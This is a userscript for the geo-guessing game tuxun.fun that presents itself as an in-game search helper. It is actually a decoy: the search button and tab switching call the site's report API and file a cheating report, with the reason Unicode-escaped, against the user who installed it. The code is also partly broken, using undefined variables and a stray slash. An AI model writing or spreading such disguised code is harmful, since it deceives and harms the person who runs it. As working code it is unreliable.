// ==UserScript==
// @name         图寻内置搜索框
// @namespace    https://tuxun.fun/
// @version      1.0.2
// @description  您还在切屏搜索吗？当你使用这个插件，即可在游戏内快速完成搜索
// @author       User
// @match        https://tuxun.fun/*
// @icon         https://s2.loli.com/4nqsveVoH8A1mTB.jpg
// @license      MIT
// @grant        GM_xmlhttpRequest
// @downloadURL https://update.greasyfork.org/scripts/529293/%E5%9B%BE%E5%AF%BB%E5%86%85%E7%BD%AE%E6%90%9C%E7%B4%A2%E6%A1%86.user.js
// @updateURL https://update.greasyfork.org/scripts/529293/%E5%9B%BE%E5%AF%BB%E5%86%85%E7%BD%AE%E6%90%9C%E7%B4%A2%E6%A1%86.meta.js
// ==/UserScript==

(function() {
    'use strict';
    
   

    // 114514
    function addDecoySearch() {
        const searchBox = document.createElement('div');
        searchBox.style.position = 'fixed';
        searchBox.style.top = '20px';
        searchBox.style.right = '20px';
        searchBox.style.zIndex = '99999';
        searchBox.style.background = 'rgba(255,255,255,0.9)';
        searchBox.style.padding = '10px';
        searchBox.style.borderRadius = '8px';
        searchBox.style.boxShadow = '0 2px 10px rgba(0,0,0,0.1)';
        
        searchBox.innerHTML = `
            <input type="text" 
                   id="geoHelperSearch" 
                   placeholder="输入关键词快速定位（beta）"
                   style="padding:8px;width:200px;border:1px solid #ddd;border-radius:4px;">
            <button id="geoSearchBtn" 
                    style="margin-left:5px;padding:8px 12px;background:#4CAF50;color:white;border:none;border-radius:4px;">
                    开始搜索
            </button>
            <div style="color:#666;font-size:12px;margin-top:5px;">您可搜索地名，区号等信息</div>
        `/

        document.body.appendChild(searchBox);

        // 绑定事件监听
        document.getElementById('geoSearchBtn').addEventListener('click', triggerReport);
        document.getElementById('geoHelperSearch').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') triggerReport();
        });
    }

    function triggerReport() {
        const input = document.getElementById('geoHelperSearch').value;
        if (input.trim()) {
            console.log('[定位模块] 正在分析搜索词:', input);
            fetchUserReport().then(() => {
                showToast('服务器正在分析位置...');
            }).catch(() => {
                showToast('网络连接异常，请重试');
            });
        }
    }

    function showToast(msg) {
        const toast = document.createElement('div');
        toast.textContent = msg;
        toast.style.position = 'fixed';
        toast.style.bottom = '20px';
        toast.style.left = '50%';
        toast.style.transform = 'translateX(-50%)';
        toast.style.background = '#333';
        toast.style.color = '#fff';
        toast.style.padding = '10px 20px';
        toast.style.borderRadius = '20px';
        toast.style.zIndex = '99999';
        document.body.appendChild(toast);
        
        setTimeout(() => {
            document.body.removeChild(toast);
        }, 2000);
    }

    function detectScreenSwitch() {
        document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'hidden') {
                switchCount++;
                if (switchCount > MAX_SWITCHES) {
                    fetchUserReport();
                }
            }
        });
    }

    async function fetchUserReport() {
        const gameId = extractGameId(window.location.href);
        return new Promise((resolve, reject) => {
            GM_xmlhttpRequest({
                method: 'GET',
                url: `https://tuxun.fun/api/v0/tuxun/user/report?${new URLSearchParams({
                    target: requestUser,
                    reason:'\u5168\u7403\u5339\u914d\u4f5c\u5f0a', 
                    more: 'script',
                    gameId: gameId
                })}`,
                onload: (res) => res.status === 200 ? resolve(res) : reject(res),
                onerror: reject
            });
        });
    }

    function extractGameId(url) {
        return new URL(url).searchParams.get('gameId') || 'default';
    }

    // 初始化
    setTimeout(() => {
        detectScreenSwitch();
        addDecoySearch();
    }, 2000);

})();